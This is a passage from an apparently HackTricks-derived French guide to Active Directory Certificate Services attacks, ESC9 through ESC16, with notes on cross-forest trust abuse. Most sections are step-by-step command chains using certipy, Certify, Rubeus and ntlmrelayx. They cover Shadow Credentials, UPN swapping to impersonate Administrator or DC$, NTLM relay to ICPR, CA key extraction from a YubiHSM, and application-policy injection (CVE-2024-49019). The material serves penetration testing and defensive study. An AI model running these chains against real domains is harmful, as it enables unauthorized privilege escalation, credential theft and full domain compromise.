Supposons que `John@corp.local` dispose de permissions `GenericWrite` sur `Jane@corp.local`, dans le but de compromettre `Administrator@corp.local`. Le template de certificat `ESC9`, auquel `Jane@corp.local` est autorisée à s'inscrire, est configuré avec le flag `CT_FLAG_NO_SECURITY_EXTENSION` dans son paramètre `msPKI-Enrollment-Flag`.

Initialement, le hash de `Jane` est obtenu en utilisant Shadow Credentials, grâce au `GenericWrite` de `John` :
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Par la suite, le `userPrincipalName` de `Jane` est modifié en `Administrator`, omettant volontairement la partie de domaine `@corp.local` :
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Cette modification ne viole pas les contraintes, étant donné que `Administrator@corp.local` reste distinct en tant que userPrincipalName de `Administrator`.

Suite à cela, le modèle de certificat `ESC9`, marqué comme vulnérable, est demandé en tant que `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
On note que le `userPrincipalName` du certificat reflète `Administrator`, dépourvu de tout “object SID”.

Le `userPrincipalName` de `Jane` est ensuite rétabli à sa valeur d'origine, `Jane@corp.local` :
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
La tentative d'authentification avec le certificat émis renvoie maintenant le hash NT de `Administrator@corp.local`. La commande doit inclure `-domain <domain>` en raison de l'absence de spécification du domaine dans le certificat :
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Faibles mappages de certificats - ESC10

### Explication

ESC10 fait référence à deux valeurs de clé de registre sur le contrôleur de domaine :

- The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.
- The default setting for `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, previously `0`.

**Cas 1**

Lorsque `StrongCertificateBindingEnforcement` est configuré à `0`.

**Cas 2**

Si `CertificateMappingMethods` inclut le bit `UPN` (`0x4`).

### Cas d'abus 1

Avec `StrongCertificateBindingEnforcement` configuré à `0`, un compte A disposant des permissions `GenericWrite` peut être exploité pour compromettre n'importe quel compte B.

Par exemple, en ayant des permissions `GenericWrite` sur `Jane@corp.local`, un attaquant cherche à compromettre `Administrator@corp.local`. La procédure reflète ESC9, permettant d'utiliser n'importe quel modèle de certificat.

Initialement, le hash de `Jane` est récupéré en utilisant Shadow Credentials, en exploitant le `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Par la suite, le `userPrincipalName` de `Jane` est modifié en `Administrator`, omettant délibérément la partie `@corp.local` pour éviter une violation de contrainte.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Suite à cela, un certificat permettant l'authentification client est demandé au nom de `Jane`, en utilisant le modèle par défaut `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Le `userPrincipalName` de `Jane` est ensuite rétabli à sa valeur originale, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
S'authentifier avec le certificat obtenu fournira le NT hash de `Administrator@corp.local`, il faut donc préciser le domaine dans la commande car le certificat ne contient pas d'informations de domaine.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Cas d'abus 2

Si la propriété `CertificateMappingMethods` contient le drapeau de bit `UPN` (`0x4`), un compte A disposant des permissions `GenericWrite` peut compromettre tout compte B dépourvu de la propriété `userPrincipalName`, y compris les comptes machine et l'administrateur de domaine intégré `Administrator`.

Ici, l'objectif est de compromettre `DC$@corp.local`, en commençant par obtenir le hash de `Jane` via Shadow Credentials, en tirant parti de `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Le `userPrincipalName` de `Jane` est ensuite défini sur `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Un certificat pour l'authentification du client est demandé en tant que `Jane` en utilisant le modèle par défaut `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Le `userPrincipalName` de `Jane` est revenu à sa valeur d'origine après ce processus.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Pour s'authentifier via Schannel, l'option `-ldap-shell` de Certipy est utilisée, indiquant un succès d'authentification en tant que `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Via le LDAP shell, des commandes telles que `set_rbcd` permettent des attaques Resource-Based Constrained Delegation (RBCD), pouvant compromettre le contrôleur de domaine.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Cette vulnérabilité s'étend également à tout compte utilisateur dépourvu d'un `userPrincipalName` ou lorsque celui-ci ne correspond pas au `sAMAccountName`, le compte par défaut `Administrator@corp.local` étant une cible privilégiée en raison de ses privilèges LDAP élevés et de l'absence par défaut d'un `userPrincipalName`.

## Relais NTLM vers ICPR - ESC11

### Explication

Si le CA Server n'est pas configuré avec `IF_ENFORCEENCRYPTICERTREQUEST`, cela permet des attaques relais NTLM sans signature via le service RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Vous pouvez utiliser `certipy` pour énumérer si `Enforce Encryption for Requests` est désactivé et certipy affichera les vulnérabilités `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scénario d'abus

Il est nécessaire de configurer un serveur de relais :
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Remarque : Pour les contrôleurs de domaine, nous devons spécifier `-template` dans DomainController.

Ou en utilisant [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Accès shell à ADCS CA avec YubiHSM - ESC12

### Explication

Les administrateurs peuvent configurer la Certificate Authority (CA) pour la stocker sur un périphérique externe comme le "Yubico YubiHSM2".

Si un périphérique USB est connecté au serveur CA via un port USB, ou via un USB device server si le serveur CA est une machine virtuelle, une authentication key (parfois appelée "password") est requise pour que le Key Storage Provider génère et utilise les clés dans le YubiHSM.

Cette key/password est stockée dans le registre sous `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` en clair.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Scénario d'abus

Si la clé privée du CA est stockée sur un périphérique USB physique et que vous obtenez un shell access, il est possible de récupérer la clé.

Dans un premier temps, vous devez obtenir le certificat du CA (c'est public) puis :
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Enfin, utilisez la commande certutil `-sign` pour forger un nouveau certificat arbitraire en utilisant le certificat CA et sa clé privée.

## OID Group Link Abuse - ESC13

### Explication

L'attribut `msPKI-Certificate-Policy` permet d'ajouter la politique d'émission au modèle de certificat. Les objets `msPKI-Enterprise-Oid` responsables de l'émission des politiques peuvent être découverts dans le Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) du conteneur PKI OID. Une politique peut être liée à un groupe AD via l'attribut `msDS-OIDToGroupLink` de cet objet, permettant à un système d'autoriser un utilisateur qui présente le certificat comme s'il était membre du groupe. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Autrement dit, lorsqu'un utilisateur a la permission d'enregistrer (enroll) un certificat et que le certificat est lié à un groupe OID, l'utilisateur peut hériter des privilèges de ce groupe.

Utilisez [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) pour trouver OIDToGroupLink :
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scénario d'abus

Identifier une permission utilisateur : utilisez `certipy find` ou `Certify.exe find /showAllPermissions`.

Si `John` dispose de la permission de demander un certificat pour `VulnerableTemplate`, l'utilisateur peut hériter des privilèges du groupe `VulnerableGroup`.

Il lui suffit de spécifier le template ; il obtiendra un certificat avec les droits OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configuration de renouvellement de certificat vulnérable - ESC14

### Explication

La description sur https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping est remarquablement complète. Ci-dessous une citation du texte original.

ESC14 concerne les vulnérabilités résultant d'un "weak explicit certificate mapping", principalement via l'utilisation incorrecte ou la configuration insecure de l'attribut `altSecurityIdentities` sur les comptes utilisateur ou ordinateur Active Directory. Cet attribut à valeurs multiples permet aux administrateurs d'associer manuellement des certificats X.509 à un compte AD pour les fins d'authentification. Lorsqu'il est renseigné, ces mappages explicites peuvent remplacer la logique de mappage de certificat par défaut, qui s'appuie typiquement sur les UPNs ou les DNS names dans le SAN du certificat, ou sur le SID intégré dans l'extension de sécurité `szOID_NTDS_CA_SECURITY_EXT`.

Un mappage "faible" survient lorsque la valeur string utilisée dans l'attribut `altSecurityIdentities` pour identifier un certificat est trop large, facilement devinable, s'appuie sur des champs de certificat non uniques, ou utilise des composants de certificat facilement usurpables. Si un attaquant peut obtenir ou fabriquer un certificat dont les attributs correspondent à un tel mappage explicite faiblement défini pour un compte privilégié, il peut utiliser ce certificat pour s'authentifier en tant que et usurper ce compte.

Exemples de chaînes de mappage `altSecurityIdentities` potentiellement faibles incluent :

- Mappage uniquement par un Subject Common Name (CN) commun : ex., `X509:<S>CN=SomeUser`. Un attaquant pourrait être capable d'obtenir un certificat avec ce CN depuis une source moins sécurisée.
- Utilisation de Issuer Distinguished Names (DNs) ou Subject DNs trop génériques sans qualification supplémentaire comme un numéro de série spécifique ou un subject key identifier : ex., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Emploi d'autres patterns prévisibles ou d'identifiants non cryptographiques qu'un attaquant pourrait satisfaire dans un certificat qu'il peut légitimement obtenir ou forger (s'il a compromis une CA ou trouvé un template vulnérable comme dans ESC1).

L'attribut `altSecurityIdentities` supporte divers formats de mappage, tels que :

- `X509:<I>IssuerDN<S>SubjectDN` (mappe par Issuer et Subject DN complets)
- `X509:<SKI>SubjectKeyIdentifier` (mappe par la valeur de l'extension Subject Key Identifier du certificat)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mappe par numéro de série, implicitement qualifié par l'Issuer DN) - ce n'est pas un format standard, généralement c'est `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mappe par un nom RFC822, typiquement une adresse e-mail, depuis le SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mappe par un hash SHA1 de la clé publique brute du certificat - généralement fort)

La sécurité de ces mappages dépend fortement de la spécificité, l'unicité et la force cryptographique des identifiants de certificat choisis dans la chaîne de mappage. Même avec des modes de liaison de certificat forts activés sur les Domain Controllers (qui affectent principalement les mappages implicites basés sur les SAN UPNs/DNS et l'extension SID), une entrée `altSecurityIdentities` mal configurée peut toujours constituer une voie directe pour l'usurpation si la logique de mappage elle-même est défaillante ou trop permissive.

### Scénario d'abus

ESC14 cible les **explicit certificate mappings** dans Active Directory (AD), spécifiquement l'attribut `altSecurityIdentities`. Si cet attribut est défini (par conception ou par mauvaise configuration), des attaquants peuvent usurper des comptes en présentant des certificats correspondant au mappage.

#### Scénario A : L'attaquant peut écrire dans `altSecurityIdentities`

**Précondition** : L'attaquant a les permissions d'écriture sur l'attribut `altSecurityIdentities` du compte cible ou la permission de le déléguer sous la forme d'une des permissions suivantes sur l'objet AD cible :
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scénario B : La cible a un mappage faible via X509RFC822 (Email)

- **Précondition** : La cible a un mappage X509RFC822 faible dans altSecurityIdentities. Un attaquant peut définir l'attribut mail de la victime pour qu'il corresponde au nom X509RFC822 de la cible, enroler un certificat en tant que la victime, et l'utiliser pour s'authentifier en tant que la cible.

#### Scénario C : La cible a un mappage X509IssuerSubject

- **Précondition** : La cible a un mappage explicite X509IssuerSubject dans `altSecurityIdentities` faible. L'attaquant peut définir l'attribut `cn` ou `dNSHostName` sur un principal victime pour qu'il corresponde au subject du mappage X509IssuerSubject de la cible. Ensuite, l'attaquant peut enroler un certificat en tant que la victime, et utiliser ce certificat pour s'authentifier en tant que la cible.

#### Scénario D : La cible a un mappage X509SubjectOnly

- **Précondition** : La cible a un mappage explicite X509SubjectOnly dans `altSecurityIdentities` faible. L'attaquant peut définir l'attribut `cn` ou `dNSHostName` sur un principal victime pour qu'il corresponde au subject du mappage X509SubjectOnly de la cible. Ensuite, l'attaquant peut enroler un certificat en tant que la victime, et utiliser ce certificat pour s'authentifier en tant que la cible.

### opérations concrètes
#### Scénario A

Demander un certificat à partir du modèle `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Enregistrer et convertir le certificat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
S'authentifier (en utilisant le certificat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Nettoyage (optionnel)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Pour des méthodes d'attaque plus spécifiques dans divers scénarios d'attaque, veuillez consulter ce qui suit : [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explication

La description sur https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc est remarquablement complète. Ci‑dessous une citation du texte original.

En utilisant les templates de certificats version 1 intégrés par défaut, un attaquant peut créer une CSR pour inclure des application policies qui seront préférées aux attributs Extended Key Usage configurés dans le template. La seule exigence est d'avoir des enrollment rights, et cela peut être utilisé pour générer des certificats client (client authentication), des certificate request agent, et des certificats de codesigning en utilisant le template **_WebServer_**.

### Abus

La référence suivante renvoie à [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.

La commande `find` de Certipy peut aider à identifier les templates V1 potentiellement vulnérables à ESC15 si la CA n'est pas patchée.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scénario A : Usurpation directe via Schannel

**Étape 1 : Demander un certificat, en injectant la politique d'application "Client Authentication" et le UPN cible.** L'attaquant `attacker@corp.local` cible `administrator@corp.local` en utilisant le template "WebServer" V1 (qui permet au demandeur de fournir le sujet).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Le template V1 vulnérable avec "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Injecte l'OID `1.3.6.1.5.5.7.3.2` dans l'extension Application Policies du CSR.
- `-upn 'administrator@corp.local'`: Définit le UPN dans le SAN pour l'usurpation d'identité.

**Étape 2 : s'authentifier via Schannel (LDAPS) en utilisant le certificat obtenu.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scénario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Étape 1 : Demander un certificat à partir d'un V1 template (avec "Enrollee supplies subject"), en injectant l'Application Policy "Certificate Request Agent".** Ce certificat permet à l'attaquant (`attacker@corp.local`) de devenir un enrollment agent. Aucun UPN n'est spécifié pour l'identité de l'attaquant ici, car l'objectif est la capacité d'agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injecte l'OID `1.3.6.1.4.1.311.20.2.1`.

**Étape 2 : Utiliser le certificat "agent" pour demander un certificat au nom d'un utilisateur privilégié ciblé.** C'est une étape ESC3-like, en utilisant le certificat de l'étape 1 comme certificat agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Étape 3: Authentifiez-vous en tant qu'utilisateur privilégié en utilisant le certificat "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Explanation

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** fait référence au scénario où, si la configuration d'AD CS n'impose pas l'inclusion de l'extension **szOID_NTDS_CA_SECURITY_EXT** dans tous les certificats, un attaquant peut exploiter cela en :

1. En demandant un certificat **sans SID binding**.

2. En utilisant ce certificat **pour s'authentifier comme n'importe quel compte**, par exemple en se faisant passer pour un compte à haut privilège (p.ex., un Domain Administrator).

Vous pouvez également consulter cet article pour en savoir plus sur le principe détaillé : https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

La suite se réfère à [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), cliquez pour voir des méthodes d'utilisation plus détaillées.

Pour identifier si l'environnement Active Directory Certificate Services (AD CS) est vulnérable à **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Étape 1 : Lire l'UPN initial du compte victime (Optionnel - pour la restauration).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Étape 2 : Mettre à jour le UPN du compte de la victime avec le `sAMAccountName` de l'administrateur cible.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Étape 3 : (si nécessaire) Obtenir les identifiants du compte "victim" (par exemple, via Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Étape 4 : Demandez un certificat en tant qu'utilisateur "victim" à partir de _n'importe quel modèle d'authentification client adapté_ (e.g., "User") sur la CA vulnérable à ESC16.** Parce que la CA est vulnérable à ESC16, elle omettra automatiquement l'extension de sécurité SID du certificat émis, quelle que soit la configuration spécifique du modèle pour cette extension. Définissez la variable d'environnement du cache d'identifiants Kerberos (commande shell) :
```bash
export KRB5CCNAME=victim.ccache
```
Puis demandez le certificat :
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Étape 5 : Rétablir le UPN du compte "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Étape 6 : S'authentifier en tant qu'administrateur cible.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Compromission des forêts par des certificats expliquée à la voix passive

### Rupture des trusts de forêt par des CA compromises

La configuration pour l'**enrôlement inter-forêts** est rendue relativement simple. Le **certificat root CA** de la forêt de ressources est **publié dans les forêts de comptes** par les administrateurs, et les certificats de l'**enterprise CA** de la forêt de ressources sont **ajoutés aux conteneurs `NTAuthCertificates` et AIA dans chaque forêt de comptes**. Pour clarifier, cette disposition confère à la **CA de la forêt de ressources un contrôle complet** sur toutes les autres forêts pour lesquelles elle gère la PKI. Si cette CA était **compromise par des attaquants**, des certificats pour tous les utilisateurs des forêts de ressources et de comptes pourraient être **forgés par ceux-ci**, rompant ainsi la frontière de sécurité de la forêt.

### Privilèges d'enrôlement accordés aux principaux étrangers

Dans les environnements multi-forêts, il convient de se montrer prudent concernant les Enterprise CAs qui **publient des templates de certificats** permettant aux **Authenticated Users** ou aux principaux étrangers (utilisateurs/groupes externes à la forêt à laquelle appartient l'Enterprise CA) des **droits d'enrôlement et de modification**.\
Lors de l'authentification via un trust, l'**Authenticated Users SID** est ajouté au token de l'utilisateur par AD. Ainsi, si un domaine possède une Enterprise CA avec un template qui **autorise l'enrôlement aux Authenticated Users**, un template pourrait potentiellement être **enrôlé par un utilisateur d'une autre forêt**. De même, si des **droits d'enrôlement sont explicitement accordés à un principal étranger par un template**, une **relation de contrôle d'accès inter-forêts est alors créée**, permettant à un principal d'une forêt de **s'enrôler dans un template d'une autre forêt**.

Les deux scénarios entraînent une **augmentation de la surface d'attaque** d'une forêt vers une autre. Les paramètres du template de certificat pourraient être exploités par un attaquant pour obtenir des privilèges supplémentaires dans un domaine étranger.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
